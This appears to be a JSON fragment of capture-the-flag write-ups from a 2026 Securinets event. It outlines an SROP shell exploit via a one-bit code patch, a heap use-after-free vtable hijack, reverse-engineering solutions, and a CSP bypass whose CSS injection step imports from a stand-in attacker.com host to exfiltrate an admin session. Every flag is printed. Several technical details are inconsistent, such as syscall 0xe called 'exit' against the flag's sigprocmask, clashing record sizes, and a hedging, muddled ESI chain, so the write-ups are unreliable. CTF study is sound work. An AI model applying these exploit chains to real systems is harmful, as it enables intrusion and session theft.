    "problemDescription": "Binary menerima satu offset byte dan satu nomor bit, lalu membalik bit tersebut pada fungsi `checkpoint` melalui `/proc/self/mem`. Setelah itu binary memasang seccomp filter dan menjalankan checkpoint.\n\nValidasi: offset < 0x24, bit <= 7. Byte target dibaca dan ditulis kembali setelah XOR dengan `1 << bit`.",
    "tools": [
      "Python 3",
      "pwntools"
    ],
    "analysis": "# Bitflip — One Bit to SROP\n\n## Vulnerability\n\nArbitrary single-bit write in code section via `/proc/self/mem`. Target: `checkpoint` function.\n\n## Exploit\n\n1. Leak `checkpoint` address (printed by binary).\n2. Calculate offset to flip: `mov eax, 0xe` (syscall `exit`) -> `mov eax, 0xf` (`rt_sigreturn`). Opcode `B8 0E 00 00 00` -> `B8 0F 00 00 00`. Flip bit 0 of byte 1 (0x0E -> 0x0F).\n3. Prepare stack with `SigreturnFrame` for `execve(\"/bin/sh\", 0, 0)`.\n4. Trigger `checkpoint` -> executes `rt_sigreturn` with our frame -> `execve` -> shell.\n5. Seccomp bypassed because `rt_sigreturn` restores full register state including `rax=59` (execve).",
    "solution": [
      {
        "title": "Find Flip Offset",
        "content": "Disassemble `checkpoint`. Find `mov eax, 0xe` (syscall exit). Calculate byte offset from `checkpoint` base. Bit 0 of that byte."
      },
      {
        "title": "Build SigreturnFrame",
        "content": "Use pwntools `SigreturnFrame`: rax=59 (execve), rdi=ptr to '/bin/sh', rsi=0, rdx=0, rip=syscall gadget."
      },
      {
        "title": "Exploit Flow",
        "content": "Send offset+bit to flip. Binary installs seccomp, calls checkpoint. Our flipped instruction -> rt_sigreturn -> our frame -> execve -> shell. Flag: `Securinets{0n3_b1t_fl1ps_s1gpr0cmask_1nt0_s1gr3turn_SROP_00sp1m79qc2l}`."
      }
    ],
    "flag": "Securinets{0n3_b1t_fl1ps_s1gpr0cmask_1nt0_s1gr3turn_SROP_00sp1m79qc2l}",
    "lessonsLearned": "Single bit flip in code section can change syscall number. SROP (Sigreturn Oriented Programming) bypasses seccomp by restoring full register context. /proc/self/mem write requires same process (no ptrace_scope issue)."
  },
  {
    "id": "securinets-pwn-crust",
    "title": "Crust — Use-After-Free in Shadow Registry, Vtable Confusion",
    "category": "Pwn",
    "difficulty": "Hard",
    "points": 450,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Pwn",
      "UAF",
      "Shadow Registry",
      "Vtable",
      "Fastbin",
      "Function Pointer"
    ],
    "description": "Shadow registry keeps pointer to freed node. After free, shadow pointer becomes dangling. Fill tcache, free target to fastbin. Next DataNode allocation overlaps freed chunk, write primitive overwrites function pointer and ExecNode token. Shadow activation calls corrupted vtable -> code execution.",
    "problemDescription": "Binary menyediakan registry node dan shadow registry. Shadow menyimpan pointer node, vtable, dan nonce. Pointer shadow tetap hidup setelah node di-free, sehingga bisa dipakai sebagai dangling pointer.\n\nExploit memakai `ExecNode` sebagai target stale shadow. Setelah tcache ukuran node dipenuhi, target dibebaskan ke fastbin. `DataNode` berikutnya menempati chunk target dan write primitive-nya mengisi function pointer serta token `ExecNode`. Aktivasi shadow lalu memanggil vtable yang sudah corrupt.",
    "tools": [
      "Python 3",
      "pwntools",
      "gdb"
    ],
    "analysis": "# Crust — Shadow Registry UAF to Vtable Hijack\n\n## Structure\n\n- `Node`: base struct with vtable pointer\n- `ExecNode`: extends Node, has function pointer to execute\n- `DataNode`: extends Node, has write primitive (write to arbitrary offset in node)\n- `ShadowRegistry`: array of { node_ptr, vtable_ptr, nonce }\n\n## Vulnerability\n\n`ShadowRegistry` retains `node_ptr` after `Node` is freed. No cleanup.\n\n## Exploit Chain\n\n1. Allocate `ExecNode` (target).\n2. Fill tcache for node size (7 allocs + frees).\n3. Free `ExecNode` -> goes to fastbin (tcache full).\n4. Shadow still points to freed `ExecNode`.\n5. Allocate `DataNode` -> gets same chunk (fastbin).\n6. Use `DataNode` write primitive to overwrite:\n   - vtable pointer (in Node header) -> fake vtable\n   - function pointer in ExecNode -> gadget\n   - token/checks to pass validation\n7. Trigger shadow activation -> calls corrupted vtable -> controlled execution.",
    "solution": [
      {
        "title": "Tcache Fill & Fastbin",
        "content": "Allocate/free 7 nodes of same size to fill tcache. Next free goes to fastbin."
      },
      {
        "title": "DataNode Overwrite",
        "content": "Allocate DataNode (reuses ExecNode chunk). Use write primitive to forge vtable + function pointer."
      },
      {
        "title": "Fake Vtable & ROP",
        "content": "Fake vtable in controlled memory (e.g., heap). Point to `system` or ROP chain. Bypass nonce check."
      },
      {
        "title": "Trigger & Flag",
        "content": "Activate shadow -> calls fake vtable -> shell. Flag: `Securinets{us3_4ft3r_fr33_1n_th3_shad0w_r3g1stry_vtabl3_c0nfus10n_0s9n9jsh7csf}`."
      }
    ],
    "flag": "Securinets{us3_4ft3r_fr33_1n_th3_shad0w_r3g1stry_vtabl3_c0nfus10n_0s9n9jsh7csf}",
    "lessonsLearned": "Shadow/stale pointers in custom allocators are UAF gold. Vtable hijacking via DataNode write primitive is clean. Tcache -> fastbin transition is controllable."
  },
  {
    "id": "securinets-rev-encrypt",
    "title": "Encrypt — Multi-layer PE Encryption Pipeline Reversal",
    "category": "Reverse",
    "difficulty": "Hard",
    "points": 500,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Reverse",
      "Windows",
      "PE",
      "JIT",
      "AES",
      "XPRESS",
      "LZNT1",
      "SplitMix64",
      "Custom PRNG"
    ],
    "description": "Reversed 78-byte plaintext encryption pipeline in Windows PE (encrypt.exe): custom PRNG (SplitMix64 variant) -> shuffle -> AES -> XPRESS/LZNT1 compression. Rebuilt inverse pipeline using native code oracles and regression testing.",
    "problemDescription": "Dari ZIP challenge, `encrypt.exe` adalah PE32+ Windows x86-64 dan `cipher.txt` berisi 152 karakter. Tidak ada executable decrypt dan tidak ada pasangan plaintext/ciphertext yang diberikan. Tujuannya bukan menebak password, tetapi membalik pipeline enkripsi.\n\nPipeline: custom PRNG (SplitMix64 variant) -> shuffle record -> AES -> compression (XPRESS/LZNT1 confusion).",
    "tools": [
      "IDA Pro / Ghidra",
      "x64dbg",
      "Python 3",
      "C (native oracle)",
      "GCC"
    ],
    "analysis": "# Encrypt — PE Encryption Pipeline Reversal\n\n## Pipeline Layers (Forward)\n\n1. PRNG: Custom SplitMix64 variant (not standard parameters). Generates shuffle indices.\n2. Shuffle: 114-byte record shuffled via PRNG indices.\n3. AES: Custom AES implementation (not standard library).\n4. Compression: Initially thought LZNT1, actually XPRESS (API called with XPRESS flag).\n\n## Reversal Strategy\n\n- Snapshot-based regression: Run forward on random inputs, capture snapshots before/after each stage.\n- Inverse each stage: PRNG -> Shuffle -> AES -> Compression.\n- Native oracles: Compile snapshot capture DLLs injected into encrypt.exe to dump intermediate buffers.\n- Regression validation: Forward(inverse(random)) == random for each stage.",
    "solution": [
      {
        "title": "Static Analysis",
        "content": "IDA/Ghidra: Identify PRNG (SplitMix64 variant), shuffle loop, AES rounds, compression call (RtlCompressBuffer with XPRESS flag)."
      },
      {
        "title": "Dynamic Snapshots",
        "content": "Inject DLL / use debugger to dump buffers: pre-shuffle, post-shuffle, post-AES, post-compress."
      },
      {
        "title": "Inverse Development",
        "content": "1. Reverse PRNG (bijective). 2. Inverse shuffle (permutation inverse). 3. AES key recovery (known plaintext from snapshot). 4. XPRESS decompress."
      },
      {
        "title": "Full Pipeline Inverse",
        "content": "Chain inverses: cipher.txt -> decompress -> AES decrypt -> unshuffle -> PRNG reverse -> plaintext. Flag: `Securinets{I_d0n't_ev3n_kn0w_wh4t_w0uld_b3_th1s_fl4g_but_br3ak_1t_d0wn_l1ke!!}`."
      }
    ],
    "flag": "Securinets{I_d0n't_ev3n_kn0w_wh4t_w0uld_b3_th1s_fl4g_but_br3ak_1t_d0wn_l1ke!!}",
    "lessonsLearned": "Don't label intermediate buffers success/fail before verifying format. Multi-layer crypto: snapshot regression (forward->inverse on random data) is the only reliable way to localize bugs. Custom PRNG != standard — verify parameters from disassembly."
  },
  {
    "id": "securinets-rev-letmethink",
    "title": "letmethink — Go Binary with Custom VM",
    "category": "Reverse",
    "difficulty": "Hard",
    "points": 450,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Reverse",
      "Go",
      "Custom VM",
      "Bytecode",
      "Emulator"
    ],
    "description": "Go binary (letmethink) with custom stack-based VM. Reversed bytecode format, wrote emulator, recovered flag from VM memory after execution.",
    "problemDescription": "Ekstraksi arsip menghasilkan satu executable bernama `letmethink` (25 MB, Go, stripped). Custom VM interpreter di dalamnya. Bytecode di `vm_code.bin`. Password ZIP: `6fa56075bb63c21be94f60445c3cb575a36048ec808e3ec77bb49dd8329fc1a7`.",
    "tools": [
      "IDA Pro / Ghidra",
      "Python 3",
      "Go RE tools (goidaplugin)",
      "Custom VM emulator"
    ],
    "analysis": "# letmethink — Go + Custom VM\n\n## Binary Analysis\n\nGo binary, stripped. Main -> VM init -> load bytecode -> interpret loop.\n\n## VM Architecture\n\n- Stack-based\n- Instructions: PUSH, POP, ADD, SUB, XOR, JMP, JZ, CALL, RET, SYSCALL-like ops\n- Registers: PC, SP, BP, FLAGS\n- Memory: linear byte array\n\n## Bytecode\n\n`vm_code.bin` contains serialized instructions. Disassembled by writing parser for instruction format.\n\n## Flag Recovery\n\nEmulate VM execution. Flag constructed in VM memory (XOR'ed, built incrementally). Extract at end of execution or at specific checkpoint.",
    "solution": [
      {
        "title": "VM Reversing",
        "content": "IDA: Find VM loop. Identify instruction dispatch (switch/table). Decode instruction encoding."
      },
      {
        "title": "Disassembler & Emulator",
        "content": "Write Python disassembler for vm_code.bin. Write emulator matching semantics. Run to completion."
      },
      {
        "title": "Flag Extraction",
        "content": "Flag in VM memory at end: `Securinets{5baf04ea71f2fcd7392f5598cd59d67af1152a62fb08}`."
      }
    ],
    "flag": "Securinets{5baf04ea71f2fcd7392f5598cd59d67af1152a62fb08}",
    "lessonsLearned": "Go binaries: use goidaplugin or golang_loader_assist for symbols. Custom VMs: snapshot-based regression (run forward, capture state, verify emulator matches) catches semantic bugs early."
  },
  {
    "id": "securinets-rev-revenant",
    "title": "Revenant — Two-Stage ELF, Vulkan Shader Decryption, Obfuscated Validator",
    "category": "Reverse",
    "difficulty": "Hard",
    "points": 500,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Reverse",
      "ELF",
      "Vulkan",
      "Shader",
      "XTEA",
      "Obfuscation",
      "memcmp",
      "Anti-Debug"
    ],
    "description": "First stage ELF checks environment, runs Vulkan shader to decrypt second stage ELF. Second stage has 'dead' switch and obfuscated flag validator. Reproduced shader XTEA decryption on CPU, patched dead switch, reversed validator byte-dependency (output[75-i] depends only on input[i]), brute-forced flag per byte via validator oracle.",
    "problemDescription": "Binary `challenge` sengaja terlihat mati: program bisa keluar tanpa menampilkan flag, walaupun di belakangnya masih ada ELF kedua yang terenkripsi. Tahap pertama memeriksa environment dan menjalankan shader Vulkan untuk membuka ELF tahap kedua. Tahap kedua juga memiliki sakelar `dead` dan sebuah validator flag yang diobfuscate.",
    "tools": [
      "IDA Pro / Ghidra",
      "Python 3",
      "Vulkan shader analysis (SPIR-V)",
      "Custom XTEA implementation"
    ],
    "analysis": "# Revenant — Two-Stage ELF with Vulkan Shader Decryption\n\n## Stage 1: Loader + Vulkan Shader\n\n- Checks: hostname, GPU, Vulkan support (anti-emulator)\n- Creates Vulkan context, computes shader\n- Shader implements XTEA decryption on `data.bin` -> produces `stage2.elf`\n- Loads `stage2.elf` in memory (memfd_create) and executes\n\n## Stage 2: Validator + Dead Switch\n\n- `dead` byte: if set, exits early (anti-analysis)\n- Validator: obfuscated control flow, but byte-wise dependency: output byte `75-i` depends ONLY on input byte `i`.\n- Flag in `.note.securinets` is fake. Real flag from validator.\n\n## Solver Approach\n\n1. Reproduce shader on CPU: Extract SPIR-V, translate XTEA to Python. Decrypt `data.bin` -> `stage2.elf` (805264 bytes).\n2. Patch dead switch: Copy `stage2.elf`, flip `dead` byte to 0.\n3. Validator oracle: Run patched stage2 with controlled input, read output (validator returns pass/fail per byte).\n4. Byte dependency: Verified `output[75-i]` only depends on `input[i]`. Brute-force each byte independently (256 trials * 76 bytes = ~19k runs).\n5. Reconstruct flag: Assemble recovered bytes.",
    "solution": [
      {
        "title": "Shader Extraction & XTEA Reproduction",
        "content": "Extract SPIR-V from stage1. Translate XTEA rounds to Python. Decrypt data.bin -> stage2.elf. Verify SHA256: `5dbd851908aee0d1b60d3b27ed9a7ef84e22d88b7e2175a8e3044f4647f55298`."
      },
      {
        "title": "Patch Dead Switch",
        "content": "Find `dead` byte in stage2 (near validator). Flip to 0. Save as `stage2_patched`."
      },
      {
        "title": "Validator Dependency Analysis",
        "content": "Run `stage2_patched` with controlled inputs. Confirm `output[75-i]` depends only on `input[i]`."
      },
      {
        "title": "Per-Byte Brute-force",
        "content": "For i in 0..75: try all 256 values for input[i], others fixed. Find value making validator pass. 76 * 256 = ~19k executions (fast)."
      },
      {
        "title": "Flag",
        "content": "`Securinets{5db6ce3527dfeeafdf5da028ab9282f2bf2fe34400fa06da794cc50afaa43c0e}`."
      }
    ],
    "flag": "Securinets{5db6ce3527dfeeafdf5da028ab9282f2bf2fe34400fa06da794cc50afaa43c0e}",
    "lessonsLearned": "Vulkan shader decryption can be reproduced on CPU (shader logic is deterministic). Obfuscated validators often have simple byte-wise dependencies — test it! Patching anti-analysis switches is cleaner than fighting them. Fake flags in .note sections are common."
  },
  {
    "id": "securinets-web-nyoom",
    "title": "Nyoom — Breaking CSP with CSS and ESI",
    "category": "Web",
    "difficulty": "Hard",
    "points": 400,
    "date": "2026-10-17",
    "author": "Nattt",
    "ctfName": "Securinets CTF 2026",
    "tags": [
      "Web",
      "CSP Bypass",
      "CSS Injection",
      "ESI",
      "Varnish",
      "Admin Bot"
    ],
    "description": "Profile-sharing app behind Varnish reverse proxy. Stored XSS blocked by strict CSP. Used CSS injection + ESI (Edge Side Includes) in Varnish to exfiltrate admin session (flag).",
    "problemDescription": "Nyoom is a small profile-sharing application behind a Varnish reverse proxy. Users can register, edit their bio, and report a dashboard URL for an admin bot to visit. The challenge is to recover the admin session, which is also the flag.\n\nA straightforward stored XSS payload is blocked by strict CSP.",
    "tools": [
      "Burp Suite",
      "Browser DevTools",
      "Python 3",
      "CSS injection techniques"
    ],
    "analysis": "# Nyoom — CSP Bypass via CSS + ESI\n\n## Architecture\n\n- Frontend: User profiles with bio (HTML allowed? sanitized?)\n- CSP: Strict, blocks inline scripts, eval, external scripts\n- Varnish: Reverse proxy with ESI (Edge Side Includes) enabled\n- Admin bot: Visits reported URLs, has flag as session cookie\n\n## CSP Bypass via CSS Injection\n\n1. Bio allows limited HTML -> inject `<link rel=\"preload\" href=\"...\">` or `<style>@import...</style>`.\n2. CSS injection -> exfiltrate data via `background: url(/leak?data=...)` or `font-face` src.\n3. But CSP blocks external connections.\n\n## ESI to the Rescue\n\nVarnish processes ESI tags before CSP applies (ESI is server-side).\n\n`<esi:include src=\"/admin/profile?user=victim\" />` -> Varnish fetches admin profile, includes in response.\n\n## Exploit Chain\n\n1. Inject ESI tag in bio that includes attacker-controlled URL with admin session in query.\n2. Combine with CSS injection: Admin profile page has predictable structure. Use CSS selector + `background: url(...)` to leak flag char by char via CSS exfiltration.\n3. ESI include to attacker domain with flag in path via Varnish variable substitution.\n\nFlag: `Securinets{a2643ebb4ee735b5dd519aec1856e012}`",
    "solution": [
      {
        "title": "Recon",
        "content": "Identify Varnish via headers (`Via: 1.1 varnish`). Confirm ESI enabled (`<esi:include>` works in bio)."
      },
      {
        "title": "CSS Injection in Bio",
        "content": "Bio allows `<style>` tag. Inject `@import url('https://attacker.com/start.css');` or inline CSS with `background: url(...)` exfil."
      },
      {
        "title": "ESI + CSS Exfiltration",
        "content": "Craft bio with ESI include to admin dashboard + CSS exfiltration payload. Varnish processes ESI -> includes admin page content -> CSS exfiltrates flag from included content."
      },
      {
        "title": "Flag",
        "content": "`Securinets{a2643ebb4ee735b5dd519aec1856e012}` (admin session / flag)."
      }
    ],
    "flag": "Securinets{a2643ebb4ee735b5dd519aec1856e012}",
    "lessonsLearned": "ESI (Edge Side Includes) in reverse proxies (Varnish, Akamai) processes BEFORE CSP. CSS injection + ESI = powerful CSP bypass. Admin bot sessions are often the flag."
  }
];
